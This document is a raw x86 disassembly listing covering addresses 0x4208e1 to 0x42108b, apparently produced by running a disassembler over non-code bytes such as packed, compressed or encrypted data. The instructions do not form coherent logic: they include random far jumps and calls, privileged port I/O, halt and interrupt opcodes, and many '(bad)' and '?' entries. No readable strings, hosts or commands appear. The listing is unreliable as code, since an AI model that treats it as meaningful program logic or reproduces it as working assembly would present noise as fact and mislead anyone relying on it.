  4208e1:	jmp    0x4208f6
  4208e3:	idiv   BYTE PTR [eax+ebp*4+0x71e2aa41]
  4208ea:	imul   esi,DWORD PTR cs:[eax-0x63c0be79],0xbdb54cca
  4208f5:	mov    BYTE PTR [edx+eiz*8],ch
  4208f8:	push   esi
  4208f9:	and    bh,BYTE PTR ds:0x9a993cc
  4208ff:	xor    ah,BYTE PTR [edi-0x5fb3d176]
  420905:	push   0x9eedeee5
  42090a:	xchg   BYTE PTR [edx+0x357b113a],bl
  420910:	adc    DWORD PTR [edi+ebp*8-0x6d],0xffffffdd
  420915:	mov    eax,0x816f56bb
  42091a:	int3   
  42091b:	pop    esi
  42091c:	lods   eax,DWORD PTR ds:[esi]
  42091d:	mov    bl,BYTE PTR [ecx-0x1a1d50e0]
  420923:	mov    DWORD PTR [ebx-0x6c],eax
  420926:	or     DWORD PTR [ecx],esp
  420928:	rcr    edi,1
  42092a:	std    
  42092b:	mov    ebp,0xe2090c7d
  420930:	xchg   BYTE PTR [ecx-0x21],bl
  420933:	sbb    ah,al
  420935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420936:	mov    edi,esp
  420938:	pushf  
  420939:	xchg   ah,cl
  42093b:	and    DWORD PTR [ebx-0x7c],0xffffffd3
  42093f:	les    ebx,FWORD PTR [edi+0x5ecd1201]
  420945:	or     eax,0xdeaecfed
  42094a:	sub    esi,0xc7994edf
  420950:	and    DWORD PTR [eax-0x58],ecx
  420953:	mov    al,0x7e
  420955:	pop    es
  420956:	dec    edi
  420957:	add    ecx,edi
  420959:	rol    bl,cl
  42095b:	hlt    
  42095c:	popf   
  42095d:	iret   
  42095e:	cmp    bl,BYTE PTR [edx-0x66166de]
  420964:	mov    bh,0xec
  420966:	jmp    0x149c:0xde0d5e28
  42096d:	in     al,dx
  42096e:	popf   
  42096f:	loope  0x42097b
  420971:	das    
  420972:	rcl    DWORD PTR [edi+0x35],cl
  420975:	idiv   DWORD PTR [edx+0x7ec7f3bc]
  42097b:	mov    ch,0x68
  42097d:	rol    bl,1
  42097f:	sbb    ecx,DWORD PTR [edi+0x3d9e9b46]
  420985:	jne    0x420989
  420987:	(bad)  
  420988:	mov    ch,0x31
  42098a:	or     cl,BYTE PTR [esi]
  42098c:	sub    al,0x82
  42098e:	outs   dx,BYTE PTR ds:[esi]
  42098f:	jmp    0x420956
  420991:	mov    bh,0x4f
  420993:	fcmovne st,st(6)
  420995:	xchg   ebx,eax
  420996:	or     ebp,esi
  420998:	clc    
  420999:	mov    esp,0x65edb386
  42099e:	adc    eax,0xd0a71df0
  4209a3:	xchg   edx,eax
  4209a4:	hlt    
  4209a5:	addr16 mov al,es:0xf1cd
  4209aa:	leave  
  4209ab:	rcl    BYTE PTR [esi+0x0],0xd3
  4209af:	sub    eax,0xc9d688f6
  4209b4:	sahf   
  4209b5:	adc    cl,ah
  4209b7:	call   0x40c:0xcadec114
  4209be:	jecxz  0x4209cc
  4209c0:	aad    0xc3
  4209c2:	mov    ebp,0xa20e1bb0
  4209c7:	ins    DWORD PTR es:[edi],dx
  4209c8:	xchg   edi,eax
  4209ca:	xchg   ecx,eax
  4209cb:	jns    0x420a25
  4209cd:	mov    WORD PTR [edx-0x62],es
  4209d0:	(bad)  [eax]
  4209d2:	rol    DWORD PTR [edx-0x1b184965],1
  4209d8:	xchg   ecx,eax
  4209d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209da:	lods   eax,DWORD PTR ds:[esi]
  4209db:	mov    bh,0x2e
  4209dd:	push   esi
  4209de:	stos   DWORD PTR es:[edi],eax
  4209df:	int    0x14
  4209e1:	repz mov ds:0xa6f90c31,eax
  4209e7:	push   ecx
  4209e8:	mov    edx,eax
  4209ea:	adc    DWORD PTR [ecx+0x6514187e],0x66198aa6
  4209f4:	mov    edx,0x867c73e1
  4209f9:	xlat   BYTE PTR ds:[ebx]
  4209fa:	std    
  4209fb:	jmp    0x4209e9
  4209fd:	es pop es
  4209ff:	mov    DWORD PTR [eax+esi*8+0x68],0xf91abab5
  420a07:	sub    eax,0xa87b4773
  420a0c:	push   ebx
  420a0d:	stos   BYTE PTR es:[edi],al
  420a0e:	daa    
  420a0f:	jbe    0x420a6d
  420a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a12:	imul   esi,edx,0xfffffff3
  420a15:	push   0xa
  420a17:	and    eax,0x7fd6208d
  420a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a1d:	xchg   esi,eax
  420a1e:	ret    0x2cd4
  420a21:	loope  0x420a0e
  420a23:	jmp    0x3549:0x7404cd35
  420a2a:	sub    al,0x10
  420a2c:	shl    DWORD PTR [ecx],cl
  420a2e:	popf   
  420a2f:	int    0x90
  420a31:	cs xchg ebx,eax
  420a33:	lock call 0xbd4:0x597e4203
  420a3b:	cdq    
  420a3c:	push   ds
  420a3d:	sbb    BYTE PTR ds:[edi],ah
  420a40:	in     al,dx
  420a41:	xchg   edx,eax
  420a42:	fwait
  420a43:	repnz push cs
  420a45:	dec    edi
  420a46:	and    al,BYTE PTR [edi+0x29]
  420a49:	or     DWORD PTR [edi-0x16],esp
  420a4c:	stc    
  420a4d:	fidivr DWORD PTR [edi+edx*8-0x3539d7c8]
  420a54:	xlat   BYTE PTR ds:[ebx]
  420a55:	inc    ebx
  420a56:	cld    
  420a57:	pop    gs
  420a59:	jl     0x420a63
  420a5b:	lea    ecx,[ecx-0x30]
  420a5e:	and    DWORD PTR [edx+0x55],edx
  420a61:	pusha  
  420a62:	push   ss
  420a63:	jle    0x420a19
  420a65:	jae    0x420a9e
  420a67:	add    bl,BYTE PTR [edi+0x45]
  420a6a:	sub    BYTE PTR [esi+0x6fba6827],ch
  420a70:	pop    ss
  420a71:	sub    edi,DWORD PTR [esi-0x38]
  420a74:	xor    DWORD PTR [eax],0xfffffff9
  420a77:	les    esp,FWORD PTR [edx]
  420a79:	xchg   ecx,eax
  420a7a:	test   al,0xeb
  420a7c:	and    DWORD PTR [ebp+ebx*1+0x308e7375],edx
  420a83:	clc    
  420a84:	in     al,0x12
  420a86:	call   0x4a00:0xa5c67bfe
  420a8d:	jb     0x420b0c
  420a8f:	push   cs
  420a90:	aad    0x34
  420a92:	(bad)  
  420a93:	pop    ss
  420a94:	mov    al,ds:0xdb228858
  420a99:	in     al,0xef
  420a9b:	mov    al,ds:0x39617249
  420aa0:	addr16 push 0xee7f6624
  420aa6:	jo     0x420a40
  420aa8:	pop    ax
  420aaa:	test   DWORD PTR [edi-0x64244bfe],0x50410918
  420ab4:	ror    DWORD PTR [ebp+0x33c4bf55],cl
  420aba:	pop    esi
  420abb:	sar    BYTE PTR [ebp+0x43c38592],1
  420ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ac2:	dec    edi
  420ac3:	lods   eax,DWORD PTR ds:[esi]
  420ac4:	mov    bl,0xf3
  420ac6:	adc    eax,ebp
  420ac8:	xchg   esp,eax
  420ac9:	rol    dh,1
  420acb:	dec    edx
  420acc:	arpl   WORD PTR [esi-0x5c],bx
  420acf:	xchg   ecx,eax
  420ad0:	clc    
  420ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ad2:	ins    DWORD PTR es:[edi],dx
  420ad3:	call   0x9127:0x49d00738
  420ada:	xor    edi,ecx
  420adc:	dec    edx
  420add:	adc    esi,DWORD PTR [eax+edi*8-0x6cc3e751]
  420ae4:	jmp    0x602a4596
  420ae9:	iret   
  420aea:	sbb    edx,DWORD PTR [edi+0x4082cb72]
  420af0:	rcr    BYTE PTR [ebp+eiz*8+0x18],0x2e
  420af5:	pop    edx
  420af6:	icebp  
  420af7:	aaa    
  420af8:	test   BYTE PTR [edi-0x5cf3a81a],al
  420afe:	adc    al,0x2
  420b00:	cmc    
  420b01:	mov    esi,0xfa87361c
  420b06:	dec    ebp
  420b07:	test   BYTE PTR [ebp-0x20],bl
  420b0a:	xchg   ebx,eax
  420b0b:	push   cs
  420b0c:	mov    bl,0x9f
  420b0e:	bound  edx,QWORD PTR [ebp+edi*2+0x590e8479]
  420b15:	stos   DWORD PTR es:[edi],eax
  420b16:	pop    ds
  420b17:	pop    ebx
  420b18:	pop    edi
  420b19:	pop    esp
  420b1a:	push   esi
  420b1b:	mov    ecx,0x86474315
  420b20:	popf   
  420b21:	mov    al,ds:0xdb9b31e8
  420b26:	jge    0x420ae5
  420b28:	div    BYTE PTR [esi+0x47]
  420b2b:	lods   eax,DWORD PTR ds:[esi]
  420b2c:	inc    BYTE PTR [esi+0x3f272289]
  420b32:	mov    al,0x5b
  420b34:	adc    eax,0x9db9efb1
  420b39:	mov    ch,0xec
  420b3b:	loopne 0x420b4a
  420b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b3e:	jne    0x420b5f
  420b40:	mov    ds:0xc8c498a0,eax
  420b45:	pop    esi
  420b46:	lea    ecx,[edx+0x67]
  420b49:	imul   ebx,DWORD PTR [ebx],0xd3b72ffc
  420b4f:	in     eax,dx
  420b50:	jae    0x420bd0
  420b52:	aad    0xba
  420b54:	cdq    
  420b55:	jge    0x420b59
  420b57:	js     0x420af9
  420b59:	rcl    BYTE PTR [eax+0x9],cl
  420b5c:	xor    ecx,DWORD PTR [ebx]
  420b5e:	mov    ah,BYTE PTR [edx-0x4a]
  420b61:	adc    ax,0xe98e
  420b65:	xor    DWORD PTR [edi-0x11bc6f9c],0xef92c7b
  420b6f:	push   0x0
  420b71:	pushf  
  420b72:	mov    al,ds:0xf4e13111
  420b77:	sbb    DWORD PTR [esi-0x66ef66a5],ebx
  420b7d:	or     eax,0x4efdcb35
  420b82:	ret    
  420b83:	mov    ebx,0xca697cf5
  420b88:	pop    es
  420b89:	cmp    BYTE PTR [edi],al
  420b8b:	inc    BYTE PTR [esi+0x3f]
  420b8e:	fst    QWORD PTR [edx]
  420b90:	pop    ebp
  420b91:	int3   
  420b92:	lahf   
  420b93:	test   eax,0x56296da0
  420b98:	jo     0x420b6c
  420b9a:	push   ds
  420b9b:	imul   BYTE PTR [edi+0x2f]
  420b9e:	lds    esi,FWORD PTR [ebx-0x33af8198]
  420ba4:	fsub   QWORD PTR [eax]
  420ba6:	inc    eax
  420ba7:	dec    edi
  420ba8:	(bad)  
  420ba9:	add    al,ch
  420bab:	cmp    ah,BYTE PTR [edi]
  420bad:	je     0x420b44
  420baf:	sahf   
  420bb0:	mov    al,ds:0xc7cbd6d9
  420bb5:	xchg   ebx,eax
  420bb6:	mov    ?,WORD PTR [eax-0xa]
  420bb9:	mov    bh,0xb1
  420bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bbc:	pop    ebx
  420bbd:	push   ds
  420bbe:	aas    
  420bbf:	jo     0x420c1c
  420bc1:	shr    BYTE PTR [eax],1
  420bc3:	jae    0x420ba7
  420bc5:	pop    edi
  420bc6:	add    eax,0x7c3e74e8
  420bcb:	xchg   ecx,eax
  420bcc:	mov    ah,0xe2
  420bce:	sub    ecx,DWORD PTR [ebx+0x59]
  420bd1:	sbb    DWORD PTR [eax+0x41],eax
  420bd4:	out    0xcd,eax
  420bd6:	adc    eax,0x70187314
  420bdb:	pop    edx
  420bdc:	enter  0x2858,0x11
  420be0:	aaa    
  420be1:	jno    0x420c0a
  420be3:	cwde   
  420be4:	and    al,0xf7
  420be6:	sbb    eax,0xc1acb126
  420beb:	(bad)  
  420bec:	pop    ebx
  420bed:	rol    edx,cl
  420bef:	mov    BYTE PTR [ebx+0x3e0b53dc],ah
  420bf5:	adc    DWORD PTR [ecx-0x77],esi
  420bf8:	mov    ch,0x7b
  420bfa:	and    DWORD PTR [ecx+eax*2],edx
  420bfd:	fs (bad) 
  420bff:	xchg   esi,eax
  420c00:	jmp    0x240a:0xfa88
  420c06:	add    BYTE PTR [ebx],0xa1
  420c09:	rcr    BYTE PTR [edx],1
  420c0b:	scas   eax,DWORD PTR es:[edi]
  420c0c:	pop    es
  420c0d:	push   esi
  420c0e:	dec    ebp
  420c0f:	out    0x52,eax
  420c11:	mov    bh,0x30
  420c13:	mov    esi,0x5a12bd88
  420c18:	push   ds
  420c19:	bound  esi,QWORD PTR [eax]
  420c1b:	sub    DWORD PTR [ecx],ebp
  420c1d:	fiadd  WORD PTR [ebp-0x65]
  420c20:	call   0x16c7:0xfb0d13ba
  420c27:	loope  0x420c19
  420c29:	lods   al,BYTE PTR ds:[esi]
  420c2a:	add    DWORD PTR [esi-0x58],ebp
  420c2d:	sub    DWORD PTR [eax-0x4a],edi
  420c30:	popf   
  420c31:	retf   
  420c32:	mov    dl,0xde
  420c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c35:	and    al,0x8b
  420c37:	mov    cl,0x7b
  420c39:	sbb    eax,0xb209bbfe
  420c3e:	imul   eax,DWORD PTR [edx],0x5450e1f0
  420c44:	pop    ss
  420c45:	fidiv  DWORD PTR [esi-0x64]
  420c48:	push   eax
  420c49:	call   0xb0e4:0x3682f8d7
  420c50:	mov    ah,BYTE PTR [ebx+0x12]
  420c53:	ins    DWORD PTR es:[edi],dx
  420c54:	or     eax,0x8b0768c3
  420c59:	es mov esp,0x2794cfd4
  420c5f:	push   ebx
  420c60:	iret   
  420c61:	sbb    al,0xa6
  420c63:	mov    ?,WORD PTR [ecx+0x4c]
  420c66:	adc    al,BYTE PTR [edi-0x37]
  420c69:	ins    BYTE PTR es:[edi],dx
  420c6a:	rcl    BYTE PTR [ebx+0x1a],1
  420c6d:	and    DWORD PTR [ebx],0x5a8b6217
  420c73:	dec    eax
  420c74:	pop    esp
  420c75:	or     BYTE PTR [ecx+0x1e],ah
  420c78:	xchg   edi,eax
  420c79:	inc    bp
  420c7b:	aam    0x11
  420c7d:	(bad)  
  420c7e:	nop
  420c7f:	mov    ch,0xba
  420c81:	mov    DWORD PTR [edi+0x8e12141],esi
  420c87:	iret   
  420c88:	add    edx,DWORD PTR [ecx+0x5a06f0c3]
  420c8e:	cwde   
  420c8f:	cdq    
  420c90:	dec    esp
  420c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c92:	out    dx,eax
  420c93:	add    dh,BYTE PTR [edx-0x215dd274]
  420c99:	xchg   esp,eax
  420c9a:	xchg   ebp,eax
  420c9b:	mov    bh,0x55
  420c9d:	sub    ebp,DWORD PTR [ecx+esi*4+0x325cbb33]
  420ca4:	xchg   ecx,eax
  420ca5:	xor    esp,edi
  420ca7:	dec    esi
  420ca8:	jno    0x420cd6
  420caa:	dec    ebx
  420cab:	cs repz (bad) 
  420cae:	std    
  420caf:	dec    ebp
  420cb0:	sbb    DWORD PTR [edx],ebp
  420cb2:	ins    BYTE PTR es:[edi],dx
  420cb3:	pushf  
  420cb4:	cmp    DWORD PTR [edx+0x17],0x8d2629f1
  420cbb:	pop    esp
  420cbc:	mov    esi,0x8f944906
  420cc1:	test   DWORD PTR [edi+eax*1-0x24e298da],ebx
  420cc8:	jl     0x420cda
  420cca:	(bad)  
  420ccb:	lahf   
  420ccc:	cmp    bl,BYTE PTR [edi]
  420cce:	stos   BYTE PTR es:[edi],al
  420ccf:	adc    al,0x29
  420cd1:	aas    
  420cd2:	dec    esi
  420cd3:	adc    dl,BYTE PTR [eax+0x2b]
  420cd6:	cmc    
  420cd7:	jg     0x420d26
  420cd9:	push   esi
  420cda:	mov    bh,0x2a
  420cdc:	cld    
  420cdd:	pop    es
  420cde:	js     0x420cdd
  420ce0:	pop    eax
  420ce1:	dec    esi
  420ce2:	cmp    ecx,ecx
  420ce4:	dec    eax
  420ce5:	or     ah,cl
  420ce7:	fxch   st(6)
  420ce9:	jecxz  0x420d09
  420ceb:	loope  0x420d3b
  420ced:	fimul  WORD PTR [ebx]
  420cef:	shl    DWORD PTR [ebx],1
  420cf1:	xor    DWORD PTR [ebp-0x4a],ebx
  420cf4:	(bad)  
  420cf5:	sub    al,0xe1
  420cf7:	std    
  420cf8:	outs   dx,DWORD PTR ds:[esi]
  420cf9:	out    0x74,eax
  420cfb:	pop    ebp
  420cfc:	je     0x420cf1
  420cfe:	fwait
  420cff:	mov    ch,0x19
  420d01:	push   edx
  420d02:	(bad)  
  420d03:	in     al,0xc6
  420d05:	arpl   WORD PTR [edx+ebx*8+0x5b],cx
  420d09:	inc    edx
  420d0a:	pop    esp
  420d0c:	push   cs
  420d0d:	std    
  420d0e:	or     bl,cl
  420d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d11:	mov    al,ds:0xcf8f0772
  420d16:	ret    
  420d17:	or     ebp,edx
  420d19:	sbb    ecx,ebp
  420d1b:	sub    BYTE PTR [edi+ebx*2+0x5b],ah
  420d1f:	sub    DWORD PTR [esi+0x314ec98d],edx
  420d25:	dec    eax
  420d26:	scas   al,BYTE PTR es:[edi]
  420d27:	mov    DWORD PTR [esi+0x65],esi
  420d2a:	sti    
  420d2b:	imul   ebp,ebx,0x97bda987
  420d31:	mov    esi,0xad7eef3
  420d36:	das    
  420d37:	inc    ebp
  420d38:	xchg   ebp,eax
  420d39:	neg    BYTE PTR ds:0x48341748
  420d3f:	fnstcw WORD PTR [eax+0x334f58b9]
  420d45:	ss aas 
  420d47:	sub    cl,bh
  420d49:	sub    al,0xe3
  420d4b:	aaa    
  420d4c:	lods   eax,DWORD PTR ds:[esi]
  420d4d:	push   0x7a
  420d4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d50:	mov    bh,0xce
  420d52:	pop    eax
  420d53:	mov    ebx,0x12c9ea06
  420d58:	mov    al,0x2c
  420d5a:	cld    
  420d5b:	lds    edx,FWORD PTR [edx+0x27]
  420d5e:	loop   0x420d46
  420d60:	inc    eax
  420d61:	shr    DWORD PTR [esi-0x8bcc4ba],0x57
  420d68:	stos   BYTE PTR es:[edi],al
  420d69:	ret    
  420d6a:	mov    dl,0xfe
  420d6c:	dec    BYTE PTR [edx+eax*1+0x55]
  420d70:	repz sahf 
  420d72:	fcomp  DWORD PTR [esi-0x1e]
  420d75:	sub    eax,0xc1c41b8e
  420d7a:	xchg   ebx,eax
  420d7b:	imul   eax,DWORD PTR [ebx-0x25ebadce],0x83d0a46c
  420d85:	adc    al,0xb1
  420d87:	cmp    DWORD PTR [edx-0x10],0xfffffff2
  420d8b:	sub    al,0x95
  420d8d:	cs pop ds
  420d8f:	dec    edx
  420d90:	jae    0x420dc4
  420d92:	pushf  
  420d93:	sbb    ah,BYTE PTR [eax]
  420d95:	inc    edi
  420d96:	in     eax,0x47
  420d98:	mov    ah,BYTE PTR [esi+edx*4]
  420d9b:	test   BYTE PTR ds:0xc3ff3c23,bh
  420da1:	clc    
  420da2:	dec    edx
  420da3:	inc    ebp
  420da4:	nop
  420da5:	test   DWORD PTR [eax+0x66],ecx
  420da8:	out    0x46,eax
  420daa:	dec    edx
  420dab:	cld    
  420dac:	loopne 0x420d7b
  420dae:	(bad)  
  420daf:	mov    al,ds:0x94c8a34
  420db4:	or     edx,esi
  420db6:	jb     0x420dee
  420db8:	pop    ds
  420db9:	push   cs
  420dba:	(bad)  
  420dbc:	leave  
  420dbd:	add    eax,DWORD PTR [ebx]
  420dbf:	(bad)  
  420dc0:	pop    ebx
  420dc1:	mov    edx,0xe9630b0e
  420dc6:	or     eax,0x5af76e3e
  420dcb:	or     esi,ebp
  420dcd:	je     0x420d81
  420dcf:	sahf   
  420dd0:	hlt    
  420dd1:	xchg   ebp,eax
  420dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dd4:	push   esp
  420dd5:	mov    bp,0x3789
  420dd9:	mov    al,ds:0xaa37b3f1
  420dde:	retf   0xf008
  420de1:	adc    BYTE PTR [edx],ch
  420de3:	clc    
  420de4:	out    0x6d,eax
  420de6:	aam    0x79
  420de8:	out    dx,eax
  420de9:	ror    ecx,1
  420deb:	fmul   DWORD PTR [eax-0x56]
  420dee:	(bad)  
  420def:	fstp   QWORD PTR ds:[edx+0xba05146]
  420df6:	cld    
  420df7:	jle    0x420dc4
  420df9:	mov    ah,0xdf
  420dfb:	(bad)
  420dff:	fmul   DWORD PTR [ebx]
  420e01:	xchg   esi,eax
  420e02:	mov    ds:0x579c8d66,al
  420e07:	fadd   st(3),st
  420e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e0a:	mov    edi,0xc4daffc7
  420e0f:	jp     0x420d94
  420e11:	pushf  
  420e12:	int    0xd3
  420e14:	mov    al,BYTE PTR [ebx+edi*4+0x63895970]
  420e1b:	add    ecx,DWORD PTR [edi]
  420e1d:	les    ecx,FWORD PTR [ebp+0x3c]
  420e20:	rcr    BYTE PTR [esi-0x68439979],cl
  420e26:	jmp    0x420e62
  420e28:	push   esp
  420e29:	inc    ebx
  420e2a:	pop    esi
  420e2b:	pushf  
  420e2c:	in     al,0x7
  420e2e:	mul    BYTE PTR [ebx-0x5d4c71f2]
  420e34:	and    DWORD PTR ds:[edx-0x2019f62],ebp
  420e3b:	bound  edi,QWORD PTR [edx+0xb]
  420e3e:	mov    bl,0x2c
  420e40:	or     BYTE PTR [ebp+0x18c5ba7d],ah
  420e46:	or     al,0x79
  420e48:	cli    
  420e49:	in     eax,dx
  420e4a:	dec    edi
  420e4b:	jmp    0x420e19
  420e4d:	or     dh,BYTE PTR [eax]
  420e4f:	mov    dl,0x4d
  420e51:	xor    BYTE PTR [ebx+eax*2],0xe1
  420e55:	jp     0x420ebb
  420e57:	pushf  
  420e58:	loopne 0x420e6a
  420e5a:	jge    0x420e1e
  420e5c:	(bad)  
  420e5e:	popa   
  420e5f:	lahf   
  420e60:	in     al,0x20
  420e62:	shl    DWORD PTR [eax],0xcd
  420e65:	cmc    
  420e66:	xchg   esp,eax
  420e67:	popf   
  420e68:	inc    ebp
  420e69:	call   0xfe24a6c8
  420e6e:	nop
  420e6f:	ja     0x420eb7
  420e71:	inc    ebp
  420e72:	sbb    al,0x9b
  420e74:	push   edi
  420e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e76:	retf   0x2ca0
  420e79:	inc    ecx
  420e7a:	bswap  ecx
  420e7c:	and    al,0xaf
  420e7e:	mov    eax,ds:0x9bd5a6d6
  420e83:	mov    BYTE PTR [edi+0x61],0xf
  420e87:	mov    fs,WORD PTR [eax+0x248779f8]
  420e8d:	inc    ebx
  420e8e:	add    BYTE PTR [esi+0x64575b1f],bl
  420e94:	imul   esp,DWORD PTR [ebx],0x6b
  420e97:	enter  0x86ab,0x9c
  420e9b:	xor    DWORD PTR ds:0xc61589c3,0x4e00391e
  420ea5:	jb     0x420ef4
  420ea7:	jns    0x420eb5
  420ea9:	sahf   
  420eaa:	jnp    0x420e6c
  420eac:	retf   0xb098
  420eaf:	cmp    edi,eax
  420eb1:	jo     0x420eec
  420eb3:	shl    DWORD PTR [edx],0x62
  420eb6:	cs call 0xa007:0xe84adec1
  420ebe:	das    
  420ebf:	pop    ecx
  420ec0:	icebp  
  420ec1:	pop    ss
  420ec2:	mov    ds:0xd9777279,al
  420ec7:	xor    dl,BYTE PTR [eax+0x31]
  420eca:	mov    bl,0x74
  420ecc:	fld    QWORD PTR [ecx+0x1]
  420ecf:	cli    
  420ed0:	ret    
  420ed1:	rol    bh,0x11
  420ed4:	scas   eax,DWORD PTR es:[edi]
  420ed5:	and    BYTE PTR [ecx],ah
  420ed7:	jmp    FWORD PTR [ebx]
  420ed9:	or     DWORD PTR [esi-0x67],ebx
  420edc:	push   gs
  420ede:	out    0xee,eax
  420ee0:	retf   
  420ee1:	stos   DWORD PTR es:[edi],eax
  420ee2:	adc    BYTE PTR [ebx+0x43d86347],cl
  420ee8:	hlt    
  420ee9:	sub    dh,BYTE PTR [ecx+esi*4]
  420eec:	not    BYTE PTR [ebx]
  420eee:	sahf   
  420eef:	xor    eax,0xdefcf92f
  420ef4:	and    BYTE PTR [ecx-0x53],cl
  420ef7:	mov    bl,0x4d
  420ef9:	mov    ds:0x196d1e0,al
  420efe:	les    eax,FWORD PTR [ebp+0xeddb40b]
  420f04:	mov    bh,0xd
  420f06:	sub    BYTE PTR [edi],0xcb
  420f09:	mov    cl,0xa
  420f0b:	and    al,0xa2
  420f0d:	test   eax,0x2c931803
  420f12:	cwde   
  420f13:	adc    al,0xf7
  420f15:	and    DWORD PTR [edi+0x574554ef],esi
  420f1b:	or     cl,BYTE PTR [ecx-0x2f]
  420f1e:	pushf  
  420f1f:	pop    ebp
  420f20:	leave  
  420f21:	ja     0x420f24
  420f23:	jmp    0xf4499269
  420f28:	frstor [esi-0x5e]
  420f2b:	das    
  420f2c:	movq   QWORD PTR [eax+0x6e743c6a],mm3
  420f33:	push   cs
  420f34:	call   0x3d9b71e1
  420f39:	adc    edx,0xa734a211
  420f3f:	xor    DWORD PTR [eax+0x48ee10ef],esp
  420f45:	fild   QWORD PTR [ebx-0x43]
  420f48:	aaa    
  420f49:	arpl   WORD PTR [ecx+0x0],dx
	...
  420f68:	add    BYTE PTR [eax],al
  420f6a:	push   ebp
  420f6b:	dec    eax
  420f6c:	inc    edx
  420f6d:	push   ebp
  420f6e:	pop    edi
  420f6f:	pop    edi
  420f70:	push   edi
  420f71:	dec    eax
  420f72:	cmp    BYTE PTR [esi-0x14],bh
  420f75:	or     ah,BYTE PTR [ebx+edi*2]
  420f78:	dec    ebx
  420f79:	sar    ch,1
  420f7b:	popf   
  420f7c:	add    DWORD PTR [eax],eax
  420f7e:	mov    DWORD PTR [esi],eax
  420f80:	add    BYTE PTR [eax],al
  420f82:	and    eax,0xc7cfac54
  420f87:	aam    0xf0
  420f89:	xchg   esi,eax
  420f8a:	jae    0x420fcb
  420f8c:	and    bl,BYTE PTR [edx]
  420f8e:	and    DWORD PTR [eax-0xe1de3d3],eax
  420f94:	xchg   esi,eax
  420f95:	mov    dh,0xed
  420f97:	stos   DWORD PTR es:[edi],eax
  420f98:	into   
  420f99:	xor    ebp,DWORD PTR [edi+eiz*2-0x232074f7]
  420fa0:	cmp    BYTE PTR [ecx+0x7b0d1926],dh
  420fa6:	mov    ebp,0xbc09aa7
  420fab:	mov    DWORD PTR [eax],ebp
  420fad:	xchg   BYTE PTR [ebx+0x22],bl
  420fb0:	or     ebp,DWORD PTR [ebp-0x3d7189a5]
  420fb6:	out    0x1a,eax
  420fb8:	push   ebp
  420fb9:	cs dec ebx
  420fbb:	cdq    
  420fbc:	mov    ebx,eax
  420fbe:	in     al,0xba
  420fc0:	adc    esp,DWORD PTR [esi]
  420fc2:	outs   dx,DWORD PTR ds:[esi]
  420fc3:	leave  
  420fc4:	js     0x421016
  420fc6:	scas   eax,DWORD PTR es:[edi]
  420fc7:	jmp    0xeffbffc4
  420fcc:	loop   0x420f9c
  420fce:	pushf  
  420fcf:	and    al,BYTE PTR [edx-0x3f]
  420fd2:	xor    ecx,ebx
  420fd4:	cmp    al,0x92
  420fd6:	cld    
  420fd7:	pop    eax
  420fd8:	pop    ss
  420fd9:	fimul  DWORD PTR [edi]
  420fdb:	fisttp DWORD PTR [eax]
  420fdd:	aam    0x8d
  420fdf:	in     al,0x8b
  420fe1:	push   ebx
  420fe2:	iret   
  420fe3:	inc    eax
  420fe4:	int    0xb1
  420fe6:	test   eax,0xa6c4edf3
  420feb:	fadd   st,st(5)
  420fed:	imul   eax,DWORD PTR [ebp+0x2a],0xffffffd5
  420ff1:	sbb    DWORD PTR cs:[ecx],0x662710df
  420ff8:	rcr    DWORD PTR [edx],cl
  420ffa:	pop    esi
  420ffb:	std    
  420ffc:	sahf   
  420ffd:	mov    ds:0xab2757a6,al
  421002:	adc    bl,bh
  421004:	in     al,dx
  421005:	inc    ebp
  421006:	sbb    al,0xab
  421008:	mov    ecx,0xfb1ba044
  42100d:	scas   eax,DWORD PTR es:[edi]
  42100e:	xlat   BYTE PTR ds:[ebx]
  42100f:	or     al,BYTE PTR [edx-0x50e8fa07]
  421015:	dec    edi
  421016:	xchg   edi,eax
  421017:	push   ecx
  421018:	retf   
  421019:	push   eax
  42101a:	loope  0x420fe3
  42101c:	not    dl
  42101e:	xor    BYTE PTR [ebx],bh
  421020:	lods   al,BYTE PTR ds:[esi]
  421021:	xchg   esp,eax
  421022:	and    DWORD PTR [edx-0x5991127f],eax
  421028:	cmp    cl,bh
  42102a:	loop   0x421071
  42102c:	clc    
  42102d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42102e:	popa   
  42102f:	pushf  
  421030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421031:	push   ds
  421032:	jmp    0x2b167837
  421037:	in     al,dx
  421038:	std    
  421039:	clc    
  42103a:	cmp    DWORD PTR [edx+0x1a],eax
  42103d:	pop    esi
  42103e:	(bad)  
  42103f:	mov    edx,0xb530fedd
  421044:	and    eax,0x856e28e5
  421049:	xor    cl,BYTE PTR ss:[eax-0x45]
  42104d:	sbb    ebp,edi
  42104f:	outs   dx,BYTE PTR ds:[esi]
  421050:	xchg   esi,eax
  421051:	je     0x4210a1
  421053:	test   al,0xc
  421055:	cmp    bh,bl
  421057:	sub    al,0x62
  421059:	das    
  42105a:	jo     0x4210d6
  42105c:	sbb    eax,0x63b5e319
  421061:	fimul  DWORD PTR [eax]
  421063:	add    BYTE PTR [ebx-0x1b898e8],al
  421069:	push   edi
  42106a:	and    al,0xc8
  42106c:	hlt    
  42106d:	cmp    ebx,DWORD PTR [ebx]
  42106f:	sub    al,0xa0
  421071:	mov    ecx,0xa4830f89
  421076:	mov    ebx,0x1b524b7a
  42107b:	popf   
  42107c:	out    0x88,eax
  42107e:	sar    BYTE PTR [esi+0xd],1
  421081:	clc    
  421082:	popa   
  421083:	add    esp,DWORD PTR [ecx-0xf1a6bb2]
  421089:	pusha  
  42108a:	dec    esp
  42108b:	mov    al,ds:0xa74c21d3
